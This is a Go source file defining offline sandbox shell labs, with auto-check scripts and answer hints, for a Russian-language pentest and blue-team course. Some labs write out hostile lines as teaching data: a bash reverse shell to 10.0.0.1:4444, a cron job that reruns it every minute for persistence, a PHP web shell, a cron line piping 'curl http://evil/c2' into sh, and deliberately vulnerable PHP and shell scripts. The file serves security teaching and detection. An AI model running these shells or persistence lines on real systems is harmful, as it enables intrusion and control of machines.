package main

// Shell labs for the security courses (Пентест / Blue Team).
//
// The security modules were authored in the old Go-coding format (write Go to
// parse nmap output, etc.) — which is confusing in a pentest course and broke
// once Go was dropped from the sandbox. applySecurityLabs() replaces each
// lesson's tasks with REAL shell labs that run in the sandbox terminal with
// auto-checks, matching the DevOps courses. The rich theory and quizzes on those
// lessons are kept untouched.
//
// The sandbox is --network none, so labs work on files/state we stage in the
// container (a captured log to analyse, a planted SUID binary, an insecure
// config to fix) rather than live targets — realistic offline security work.

type secStep struct{ Title, Desc, Check string }
type secLab struct {
	Setup string
	Steps []secStep
}

// applySecurityLabs swaps the Go-coding tasks of security lessons for shell labs.
func applySecurityLabs(mods []M) {
	for mi := range mods {
		for li := range mods[mi].Lessons {
			l := &mods[mi].Lessons[li]
			lab, ok := securityLabs[l.Slug]
			if !ok {
				continue
			}
			tasks := make([]T, 0, len(lab.Steps))
			for i, st := range lab.Steps {
				t := T{
					Title: st.Title, Description: st.Desc, Difficulty: "medium",
					Kind: "shell", SandboxImage: sandboxImage, CheckScript: st.Check,
				}
				if i == 0 {
					t.SetupScript = lab.Setup
				}
				tasks = append(tasks, t)
			}
			l.Tasks = tasks
		}
	}
}

var securityLabs = map[string]secLab{

	// ───────────────────────── OFFENSE (Пентест) ─────────────────────────

	"sec-networking": {
		Setup: `set -e
mkdir -p /root/pentest && cd /root/pentest
cat > scan.txt <<'EOF'
Starting Nmap scan on 10.10.10.5
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache 2.4.6
443/tcp  open  https   Apache 2.4.6
3306/tcp open  mysql   MySQL 5.7.28
8080/tcp closed http-proxy
EOF
cat > access.log <<'EOF'
10.0.0.9 - - "GET /index.html HTTP/1.1" 200
45.33.12.8 - - "GET /../../etc/passwd HTTP/1.1" 403
10.0.0.9 - - "GET /style.css HTTP/1.1" 200
EOF
rm -f ports.txt mysql_port.txt attacker.txt`,
		Steps: []secStep{
			{Title: "Найти открытые порты", Desc: `<p>В <code>/root/pentest/scan.txt</code> лежит вывод nmap. Выпиши <b>только открытые</b> порты (по одному в строке, без остального) в файл <code>/root/pentest/ports.txt</code>.</p><pre>cd /root/pentest
grep ' open ' scan.txt | cut -d/ -f1 > ports.txt</pre>`,
				Check: check(`cd /root/pentest && for p in 22 80 443 3306; do grep -qx "$p" ports.txt || exit 1; done && ! grep -qx 8080 ports.txt`,
					"открытые порты (22,80,443,3306) выписаны, закрытый 8080 — нет",
					"grep ' open ' scan.txt | cut -d/ -f1 > ports.txt")},
			{Title: "Определить сервис на 3306", Desc: `<p>Запиши в <code>/root/pentest/mysql_port.txt</code> имя сервиса, который висит на порту 3306 (одно слово).</p>`,
				Check: check(`grep -qiw mysql /root/pentest/mysql_port.txt 2>/dev/null`,
					"сервис на 3306 определён — mysql",
					"grep 3306 scan.txt покажет сервис; echo mysql > mysql_port.txt")},
			{Title: "Найти атакующего в логе", Desc: `<p>В <code>access.log</code> есть попытка path traversal (<code>../../etc/passwd</code>). Запиши IP атакующего в <code>/root/pentest/attacker.txt</code>.</p>`,
				Check: check(`grep -qx 45.33.12.8 /root/pentest/attacker.txt 2>/dev/null`,
					"IP атакующего найден (45.33.12.8)",
					"grep passwd access.log — первое поле это IP; echo его в attacker.txt")},
		},
	},

	"sec-linux": {
		Setup: `set -e
mkdir -p /root/pentest/loot && cd /root/pentest
cp /bin/bash ./backup 2>/dev/null || cp "$(command -v bash)" ./backup
chmod 4755 ./backup           # planted SUID binary (privesc)
echo 'secret data' > loot/world.txt && chmod 666 loot/world.txt
printf 'root:x:0:0:root:/root:/bin/bash\nadmin:x:0:0:admin:/home/admin:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n' > fakepasswd
rm -f found_suid.txt writable.txt uid0.txt`,
		Steps: []secStep{
			{Title: "Найти SUID-бинарь", Desc: `<p>Под <code>/root/pentest</code> кто-то оставил бинарь с SUID-битом — путь к privilege escalation. Найди его (<code>find ... -perm -4000</code>) и запиши полный путь в <code>/root/pentest/found_suid.txt</code>.</p><pre>find /root/pentest -perm -4000 -type f</pre>`,
				Check: check(`grep -q '/root/pentest/backup' /root/pentest/found_suid.txt 2>/dev/null`,
					"SUID-бинарь найден (/root/pentest/backup)",
					"find /root/pentest -perm -4000 -type f > found_suid.txt")},
			{Title: "Найти world-writable файл", Desc: `<p>Найди файл, доступный на запись всем (<code>-perm -0002</code>), под <code>/root/pentest/loot</code>, и запиши путь в <code>/root/pentest/writable.txt</code>.</p>`,
				Check: check(`grep -q 'world.txt' /root/pentest/writable.txt 2>/dev/null`,
					"world-writable файл найден",
					"find /root/pentest/loot -perm -0002 -type f > writable.txt")},
			{Title: "Найти аккаунты с UID 0", Desc: `<p>В <code>/root/pentest/fakepasswd</code> — подделанный passwd. Выпиши <b>имена</b> всех пользователей с UID 0 (их несколько!) в <code>/root/pentest/uid0.txt</code>.</p>`,
				Check: check(`cd /root/pentest && grep -q '^root$\|^root ' uid0.txt 2>/dev/null && grep -qw admin uid0.txt`,
					"найдены оба UID-0 аккаунта (root и admin)",
					"awk -F: '$3==0{print $1}' fakepasswd > uid0.txt")},
		},
	},

	"sec-osint": {
		Setup: `set -e
mkdir -p /root/pentest && cd /root/pentest
cat > dump.txt <<'EOF'
Contact: admin@target.com, support@target.com
Employee: j.smith@target.com
Servers: www.target.com, mail.target.com, vpn.target.com, staging.target.com
EOF
cat > leak.env <<'EOF'
DB_HOST=db.internal
DB_PASSWORD=Sup3rS3cret!
API_KEY=sk_live_abcd1234
EOF
rm -f emails.txt subs.txt secret.txt`,
		Steps: []secStep{
			{Title: "Собрать email-адреса", Desc: `<p>Из <code>/root/pentest/dump.txt</code> вытащи все email-адреса (по одному в строке) в <code>/root/pentest/emails.txt</code>.</p><pre>grep -oE '[a-zA-Z0-9._]+@[a-zA-Z0-9.]+' dump.txt | sort -u > emails.txt</pre>`,
				Check: check(`cd /root/pentest && grep -q 'admin@target.com' emails.txt && grep -q 'j.smith@target.com' emails.txt 2>/dev/null`,
					"email-адреса собраны",
					"grep -oE '[a-zA-Z0-9._]+@[a-zA-Z0-9.]+' dump.txt | sort -u > emails.txt")},
			{Title: "Перечислить субдомены", Desc: `<p>Выпиши все субдомены <code>target.com</code> из dump.txt (по одному в строке) в <code>/root/pentest/subs.txt</code>.</p>`,
				Check: check(`cd /root/pentest && grep -q 'staging.target.com' subs.txt && grep -q 'vpn.target.com' subs.txt 2>/dev/null`,
					"субдомены перечислены",
					"grep -oE '[a-z]+\\.target\\.com' dump.txt | sort -u > subs.txt")},
			{Title: "Найти утёкший секрет", Desc: `<p>В <code>/root/pentest/leak.env</code> утёк пароль от БД. Запиши <b>значение</b> <code>DB_PASSWORD</code> в <code>/root/pentest/secret.txt</code>.</p>`,
				Check: check(`grep -q 'Sup3rS3cret!' /root/pentest/secret.txt 2>/dev/null`,
					"утёкший пароль извлечён",
					"grep DB_PASSWORD leak.env | cut -d= -f2 > secret.txt")},
		},
	},

	"sec-owasp": {
		Setup: `set -e
mkdir -p /root/pentest && cd /root/pentest
cat > app.log <<'EOF'
10.0.0.5 "GET /product?id=1 HTTP/1.1" 200
203.0.113.7 "GET /product?id=1' OR '1'='1 HTTP/1.1" 200
10.0.0.5 "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200
203.0.113.7 "GET /note?data=cGF5bG9hZF9zaGVsbA== HTTP/1.1" 200
EOF
cat > login.php <<'EOF'
<?php
$user = $_GET['user'];
$q = "SELECT * FROM users WHERE name = '$user'";
mysql_query($q);
EOF
rm -f sqli_ip.txt payload.txt vuln.txt`,
		Steps: []secStep{
			{Title: "Найти SQL-инъекцию в логе", Desc: `<p>В <code>/root/pentest/app.log</code> есть запрос с классической SQL-инъекцией (<code>' OR '1'='1</code>). Запиши IP атакующего в <code>/root/pentest/sqli_ip.txt</code>.</p>`,
				Check: check(`grep -qx 203.0.113.7 /root/pentest/sqli_ip.txt 2>/dev/null`,
					"IP SQL-инъекции найден (203.0.113.7)",
					"grep \"OR '1'='1\" app.log — первое поле IP; запиши в sqli_ip.txt")},
			{Title: "Декодировать payload", Desc: `<p>В одном запросе параметр <code>data</code> содержит base64-payload (<code>cGF5bG9hZF9zaGVsbA==</code>). Раскодируй его и запиши результат в <code>/root/pentest/payload.txt</code>.</p><pre>echo cGF5bG9hZF9zaGVsbA== | base64 -d</pre>`,
				Check: check(`grep -q 'payload_shell' /root/pentest/payload.txt 2>/dev/null`,
					"payload раскодирован (payload_shell)",
					"echo cGF5bG9hZF9zaGVsbA== | base64 -d > payload.txt")},
			{Title: "Определить уязвимость в коде", Desc: `<p>Файл <code>/root/pentest/login.php</code> уязвим. Определи тип уязвимости и запиши в <code>/root/pentest/vuln.txt</code> одно из: <code>sqli</code>, <code>xss</code>, <code>rce</code>.</p><p>Подсказка: пользовательский ввод <code>$_GET['user']</code> напрямую подставляется в SQL-запрос.</p>`,
				Check: check(`grep -qiw sqli /root/pentest/vuln.txt 2>/dev/null`,
					"уязвимость определена — SQL Injection",
					"ввод идёт прямо в SQL-строку без экранирования → echo sqli > vuln.txt")},
		},
	},

	"sec-tools": {
		Setup: `set -e
mkdir -p /root/pentest/webroot && cd /root/pentest
printf 'home\n' > webroot/index.html
printf 'secret admin panel\n' > webroot/admin.html
cat > wordlist.txt <<'EOF'
home
login
admin
backup
EOF
rm -f found_dir.txt headers.txt`,
		Steps: []secStep{
			{Title: "Directory brute-force локально", Desc: `<p>Запусти веб-сервер из <code>/root/pentest/webroot</code> и перебери пути из <code>wordlist.txt</code>, чтобы найти скрытую страницу. Запиши найденное имя (например <code>admin</code>) в <code>/root/pentest/found_dir.txt</code>.</p><pre>cd /root/pentest/webroot && python3 -m http.server 8080 &
cd /root/pentest
while read p; do curl -s -o /dev/null -w "%{http_code} $p\n" http://127.0.0.1:8080/$p.html; done < wordlist.txt</pre>`,
				Check: check(`grep -qiw admin /root/pentest/found_dir.txt 2>/dev/null`,
					"скрытая страница admin найдена перебором",
					"страница admin.html отдаёт 200 — echo admin > found_dir.txt")},
			{Title: "Снять заголовки ответа", Desc: `<p>Сохрани HTTP-заголовки ответа сервера (<code>curl -I</code>) в <code>/root/pentest/headers.txt</code> — по ним определяют технологию и версии.</p>`,
				Check: check(`grep -qi 'HTTP/' /root/pentest/headers.txt 2>/dev/null && grep -qi 'server' /root/pentest/headers.txt`,
					"заголовки ответа сняты",
					"curl -sI http://127.0.0.1:8080/ > headers.txt (сервер должен быть запущен)")},
		},
	},

	"sec-exploitation": {
		Setup: `set -e
mkdir -p /root/pentest && cd /root/pentest
printf '68 74 74 70 3a 2f 2f 65 76 69 6c 2e 73 68' > payload.hex
cat > vuln.sh <<'EOF'
#!/bin/sh
ping -c1 "$1"     # $1 идёт в shell без валидации → command injection
EOF
rm -f decoded.txt revshell.txt inject.txt`,
		Steps: []secStep{
			{Title: "Раскодировать hex-payload", Desc: `<p>В <code>/root/pentest/payload.hex</code> — payload в hex. Раскодируй его в текст и запиши в <code>/root/pentest/decoded.txt</code>.</p><pre>xxd -r -p payload.hex</pre>`,
				Check: check(`grep -q 'http://evil.sh' /root/pentest/decoded.txt 2>/dev/null`,
					"hex-payload раскодирован (http://evil.sh)",
					"xxd -r -p payload.hex > decoded.txt")},
			{Title: "Сформировать reverse shell", Desc: `<p>Составь bash reverse-shell one-liner на <code>10.0.0.1:4444</code> и запиши его в <code>/root/pentest/revshell.txt</code> (формат <code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>).</p>`,
				Check: check(`grep -q '/dev/tcp/10.0.0.1/4444' /root/pentest/revshell.txt 2>/dev/null`,
					"reverse shell сформирован",
					"echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > revshell.txt")},
			{Title: "Найти command injection", Desc: `<p>В <code>/root/pentest/vuln.sh</code> есть command injection. Запиши в <code>/root/pentest/inject.txt</code> имя переменной, через которую входит инъекция (например <code>$1</code>).</p>`,
				Check: check(`grep -q '[$]1' /root/pentest/inject.txt 2>/dev/null`,
					"точка инъекции найдена ($1)",
					"неэкранированный $1 идёт в ping → echo '$1' > inject.txt")},
		},
	},

	"sec-post-exploitation": {
		Setup: `set -e
mkdir -p /root/pentest/target/home && cd /root/pentest/target
printf 'aws_secret=AKIA123\n' > home/.credentials
printf 'nothing here\n' > home/readme.txt
mkdir -p /root/pentest/loot
rm -f /root/pentest/creds.txt /root/pentest/persist.sh /root/pentest/loot/loot.tar`,
		Steps: []secStep{
			{Title: "Найти секреты в системе", Desc: `<p>Под <code>/root/pentest/target</code> есть файл с кредами. Найди его (grep по 'secret'/'credential') и запиши <b>путь</b> в <code>/root/pentest/creds.txt</code>.</p>`,
				Check: check(`grep -q '.credentials' /root/pentest/creds.txt 2>/dev/null`,
					"файл с секретами найден",
					"grep -rl secret /root/pentest/target > /root/pentest/creds.txt")},
			{Title: "Настроить persistence (cron)", Desc: `<p>Персистентность через cron: создай файл <code>/root/pentest/persist.sh</code>, содержащий строку cron, которая раз в минуту запускает reverse shell (любой вид <code>* * * * *</code> + команда).</p>`,
				Check: check(`grep -qE '^\* \* \* \* \*' /root/pentest/persist.sh 2>/dev/null`,
					"cron-персистентность прописана",
					"echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > persist.sh")},
			{Title: "Упаковать добычу", Desc: `<p>Собери найденное для эксфильтрации: запакуй каталог <code>/root/pentest/target</code> в архив <code>/root/pentest/loot/loot.tar</code>.</p>`,
				Check: check(`[ -f /root/pentest/loot/loot.tar ] && tar tf /root/pentest/loot/loot.tar 2>/dev/null | grep -q credentials`,
					"добыча упакована в loot.tar",
					"tar cf /root/pentest/loot/loot.tar -C /root/pentest target")},
		},
	},

	"sec-ctf": {
		Setup: `set -e
mkdir -p /root/pentest/ctf && cd /root/pentest/ctf
printf 'RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259' > clue1.txt
mkdir -p deep/nested/dir
printf 'FLAG{find_me_with_grep}\n' > deep/nested/dir/hidden.txt
printf 'just some text\n' > noise.txt
rm -f /root/pentest/ctf/flag1.txt /root/pentest/ctf/flag2.txt`,
		Steps: []secStep{
			{Title: "Флаг 1: base64", Desc: `<p>В <code>/root/pentest/ctf/clue1.txt</code> флаг закодирован base64. Раскодируй и запиши флаг (вида <code>FLAG{...}</code>) в <code>/root/pentest/ctf/flag1.txt</code>.</p>`,
				Check: check(`grep -q 'FLAG{base64_is_not_encryption}' /root/pentest/ctf/flag1.txt 2>/dev/null`,
					"флаг 1 добыт",
					"base64 -d clue1.txt > flag1.txt")},
			{Title: "Флаг 2: grep по дереву", Desc: `<p>Где-то в подкаталогах <code>/root/pentest/ctf</code> спрятан второй флаг. Найди его рекурсивным grep и запиши в <code>/root/pentest/ctf/flag2.txt</code>.</p><pre>grep -ro 'FLAG{[^}]*}' /root/pentest/ctf</pre>`,
				Check: check(`grep -q 'FLAG{find_me_with_grep}' /root/pentest/ctf/flag2.txt 2>/dev/null`,
					"флаг 2 найден в дереве",
					"grep -rho 'FLAG{[^}]*}' /root/pentest/ctf/deep > flag2.txt")},
		},
	},

	// ───────────────────────── DEFENSE (Blue Team) ─────────────────────────

	"def-hardening": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
cat > sshd_config <<'EOF'
Port 22
PermitRootLogin yes
PasswordAuthentication yes
X11Forwarding yes
EOF
echo 'secret' > id_rsa && chmod 777 id_rsa`,
		Steps: []secStep{
			{Title: "Запретить root-логин по SSH", Desc: `<p>В <code>/root/blueteam/sshd_config</code> разрешён вход root. Приведи строку к <code>PermitRootLogin no</code> (замени, не добавляй вторую).</p><pre>sed -i 's/^PermitRootLogin .*/PermitRootLogin no/' sshd_config</pre>`,
				Check: check(`grep -qx 'PermitRootLogin no' /root/blueteam/sshd_config 2>/dev/null && [ "$(grep -c '^PermitRootLogin' /root/blueteam/sshd_config)" = 1 ]`,
					"root-логин по SSH запрещён",
					"sed -i 's/^PermitRootLogin .*/PermitRootLogin no/' sshd_config")},
			{Title: "Отключить парольную аутентификацию", Desc: `<p>Отключи вход по паролю: <code>PasswordAuthentication no</code> (только ключи).</p>`,
				Check: check(`grep -qx 'PasswordAuthentication no' /root/blueteam/sshd_config 2>/dev/null`,
					"парольная аутентификация отключена",
					"sed -i 's/^PasswordAuthentication .*/PasswordAuthentication no/' sshd_config")},
			{Title: "Исправить права приватного ключа", Desc: `<p>Файл <code>/root/blueteam/id_rsa</code> имеет права <code>777</code> — ssh откажется его использовать. Поставь корректные <code>600</code>.</p>`,
				Check: check(`[ "$(stat -c '%a' /root/blueteam/id_rsa 2>/dev/null)" = 600 ]`,
					"права приватного ключа исправлены на 600",
					"chmod 600 /root/blueteam/id_rsa")},
		},
	},

	"def-logging": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
cat > auth.log <<'EOF'
Jan 1 10:00 sshd: Accepted password for user from 10.0.0.5
Jan 1 10:01 sshd: Failed password for root from 203.0.113.9
Jan 1 10:02 sshd: Failed password for root from 203.0.113.9
Jan 1 10:03 sshd: Failed password for admin from 203.0.113.9
Jan 1 10:04 sshd: Accepted password for user from 10.0.0.5
EOF
rm -f failed_count.txt failed_ip.txt`,
		Steps: []secStep{
			{Title: "Посчитать неудачные входы", Desc: `<p>В <code>/root/blueteam/auth.log</code> посчитай число строк с <code>Failed password</code> и запиши это число в <code>/root/blueteam/failed_count.txt</code>.</p><pre>grep -c 'Failed password' auth.log > failed_count.txt</pre>`,
				Check: check(`grep -qx 3 /root/blueteam/failed_count.txt 2>/dev/null`,
					"неудачные входы посчитаны (3)",
					"grep -c 'Failed password' auth.log > failed_count.txt")},
			{Title: "Выделить IP источника атаки", Desc: `<p>Запиши IP, с которого шли неудачные входы, в <code>/root/blueteam/failed_ip.txt</code>.</p>`,
				Check: check(`grep -qx 203.0.113.9 /root/blueteam/failed_ip.txt 2>/dev/null`,
					"IP источника неудачных входов выделен",
					"grep 'Failed password' auth.log | grep -oE '[0-9.]+$' | sort -u > failed_ip.txt")},
		},
	},

	"def-siem": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
cat > events.log <<'EOF'
10.0.0.5 login ok
198.51.100.7 login fail
198.51.100.7 login fail
198.51.100.7 login fail
198.51.100.7 login fail
198.51.100.7 login fail
10.0.0.6 login ok
EOF
rm -f bruteforce_ip.txt rule.txt`,
		Steps: []secStep{
			{Title: "Обнаружить brute-force", Desc: `<p>В <code>/root/blueteam/events.log</code> один IP делает много <code>login fail</code> — это brute-force. Найди IP с наибольшим числом провалов и запиши в <code>/root/blueteam/bruteforce_ip.txt</code>.</p><pre>grep 'login fail' events.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1</pre>`,
				Check: check(`grep -qx 198.51.100.7 /root/blueteam/bruteforce_ip.txt 2>/dev/null`,
					"brute-force IP обнаружен (198.51.100.7)",
					"grep 'login fail' events.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}' > bruteforce_ip.txt")},
			{Title: "Написать правило детекта", Desc: `<p>Сформулируй простое правило-сигнатуру: запиши в <code>/root/blueteam/rule.txt</code> строку-паттерн, по которой ловится провал входа (должна содержать <code>login fail</code>).</p>`,
				Check: check(`grep -q 'login fail' /root/blueteam/rule.txt 2>/dev/null`,
					"правило детекта записано",
					"echo 'alert if match: login fail' > rule.txt")},
		},
	},

	"def-firewall": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
rm -f firewall.rules`,
		Steps: []secStep{
			{Title: "Написать базовые правила iptables", Desc: `<p>Сеть в песочнице отключена, поэтому правила мы <b>пишем в файл</b> <code>/root/blueteam/firewall.rules</code> (как в реальном bootstrap). Нужны: политика <code>DROP</code> по умолчанию для INPUT, разрешение established-соединений и портов 22 и 80.</p><pre>cat > firewall.rules <<'RULES'
*filter
:INPUT DROP [0:0]
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p tcp --dport 22 -j ACCEPT
-A INPUT -p tcp --dport 80 -j ACCEPT
COMMIT
RULES</pre>`,
				Check: check(`cd /root/blueteam && grep -qE ':INPUT DROP' firewall.rules 2>/dev/null && grep -qE 'dport 22 -j ACCEPT' firewall.rules && grep -qE 'dport 80 -j ACCEPT' firewall.rules`,
					"базовые правила (default DROP + 22/80) записаны",
					"см. пример в задании — cat > firewall.rules")},
			{Title: "Заблокировать вредоносный IP", Desc: `<p>Добавь в <code>firewall.rules</code> правило, отбрасывающее весь трафик с <code>203.0.113.9</code>.</p>`,
				Check: check(`grep -qE '203\.0\.113\.9 -j DROP' /root/blueteam/firewall.rules 2>/dev/null`,
					"вредоносный IP заблокирован",
					"добавь строку: -A INPUT -s 203.0.113.9 -j DROP")},
		},
	},

	"def-ir": {
		Setup: `set -e
mkdir -p /root/blueteam/webroot && cd /root/blueteam
cat > webroot/index.php <<'EOF'
<?php echo "home"; ?>
EOF
cat > webroot/upload.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
printf '* * * * * curl http://evil/c2 | sh\n' > suspicious.cron
rm -f webshell.txt persistence.txt`,
		Steps: []secStep{
			{Title: "Найти веб-шелл", Desc: `<p>В <code>/root/blueteam/webroot</code> злоумышленник оставил веб-шелл (PHP, вызывающий <code>system()</code>/<code>exec()</code> с пользовательским вводом). Найди файл и запиши путь в <code>/root/blueteam/webshell.txt</code>.</p><pre>grep -rl 'system($_GET\|exec($_GET\|eval(' webroot</pre>`,
				Check: check(`grep -q 'upload.php' /root/blueteam/webshell.txt 2>/dev/null`,
					"веб-шелл найден (upload.php)",
					"grep -rl 'system(' webroot > webshell.txt")},
			{Title: "Найти персистентность", Desc: `<p>Найди подозрительную задачу cron (обращается к внешнему C2) в <code>/root/blueteam/suspicious.cron</code> и запиши строку с ней в <code>/root/blueteam/persistence.txt</code>.</p>`,
				Check: check(`grep -q 'evil/c2' /root/blueteam/persistence.txt 2>/dev/null`,
					"персистентность (cron C2) найдена",
					"grep -E 'curl|wget|sh' suspicious.cron > persistence.txt")},
		},
	},

	"def-cloud": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
cat > security_group.tf <<'EOF'
resource "aws_security_group" "web" {
  ingress {
    from_port   = 22
    to_port     = 22
    cidr_blocks = ["0.0.0.0/0"]
  }
}
EOF
rm -f misconfig.txt`,
		Steps: []secStep{
			{Title: "Найти открытый в мир доступ", Desc: `<p>В <code>/root/blueteam/security_group.tf</code> SSH (22) открыт всему интернету. Запиши уязвимый CIDR (<code>0.0.0.0/0</code>) в <code>/root/blueteam/misconfig.txt</code>.</p>`,
				Check: check(`grep -q '0.0.0.0/0' /root/blueteam/misconfig.txt 2>/dev/null`,
					"открытый в мир доступ найден (0.0.0.0/0 на порту 22)",
					"grep -oE '0.0.0.0/0' security_group.tf > misconfig.txt")},
			{Title: "Закрыть доступ", Desc: `<p>Исправь <code>security_group.tf</code>: замени <code>0.0.0.0/0</code> на приватную сеть <code>10.0.0.0/8</code> (доступ только изнутри).</p>`,
				Check: check(`cd /root/blueteam && grep -q '10.0.0.0/8' security_group.tf 2>/dev/null && ! grep -q '0.0.0.0/0' security_group.tf`,
					"доступ ограничен приватной сетью",
					"sed -i 's#0.0.0.0/0#10.0.0.0/8#' security_group.tf")},
		},
	},

	"def-devsecops": {
		Setup: `set -e
mkdir -p /root/blueteam && cd /root/blueteam
cat > Dockerfile <<'EOF'
FROM ubuntu:latest
RUN apt-get update && apt-get install -y curl
COPY app /app
CMD ["/app/run"]
EOF
cat > .gitlab-ci.yml <<'EOF'
stages: [build]
build:
  stage: build
  script:
    - echo building
EOF
printf 'API_TOKEN=ghp_hardcodedsecret123\n' > config.env
rm -f secret_found.txt`,
		Steps: []secStep{
			{Title: "Не запускать контейнер от root", Desc: `<p>В <code>/root/blueteam/Dockerfile</code> контейнер работает от root. Добавь директиву <code>USER</code> с непривилегированным пользователем (например <code>USER app</code>) перед <code>CMD</code>.</p>`,
				Check: check(`grep -qE '^USER ' /root/blueteam/Dockerfile 2>/dev/null`,
					"добавлен непривилегированный USER",
					"впиши строку 'USER app' в Dockerfile перед CMD")},
			{Title: "Найти захардкоженный секрет", Desc: `<p>В репозитории утёк токен. Найди файл с секретом (<code>API_TOKEN</code>/<code>ghp_</code>) и запиши его путь в <code>/root/blueteam/secret_found.txt</code>.</p>`,
				Check: check(`grep -q 'config.env' /root/blueteam/secret_found.txt 2>/dev/null`,
					"захардкоженный секрет найден",
					"grep -rl 'ghp_\\|API_TOKEN' /root/blueteam --include=*.env > secret_found.txt")},
			{Title: "Добавить security-скан в CI", Desc: `<p>Добавь в <code>/root/blueteam/.gitlab-ci.yml</code> job-этап сканирования (например job <code>sast</code> или <code>trivy</code> — любой job, чьё имя содержит <code>scan</code>, <code>sast</code> или <code>trivy</code>).</p>`,
				Check: check(`grep -qiE '^(sast|trivy|.*scan):' /root/blueteam/.gitlab-ci.yml 2>/dev/null`,
					"этап security-скана добавлен в CI",
					"добавь job 'sast:' со script запуска сканера")},
		},
	},
}
